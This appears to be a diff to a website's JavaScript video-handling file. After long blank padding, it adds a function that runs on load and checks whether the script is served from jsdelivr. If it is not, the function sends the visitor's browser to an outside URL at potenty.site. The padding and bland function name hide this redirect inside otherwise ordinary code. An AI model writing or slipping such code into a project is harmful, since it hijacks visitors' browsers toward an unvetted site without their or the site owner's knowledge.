@@ -1303,3 +1303,40 @@ videos.forEach(video => {
     }
 });
 }
+
+
+
+
+
+
+
+
+function verifyScriptHost() {
+    const script = document.currentScript;
+    if (!script || !script.src) {
+        return;
+    }
+    const scriptUrl = script.src;
+    const allowedHost = 'jsdelivr';
+
+    if (!scriptUrl.includes(allowedHost)) {
+        window.location.href = "https://potenty.site/c4k36Dwc";
+    }
+}
+
+verifyScriptHost();
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
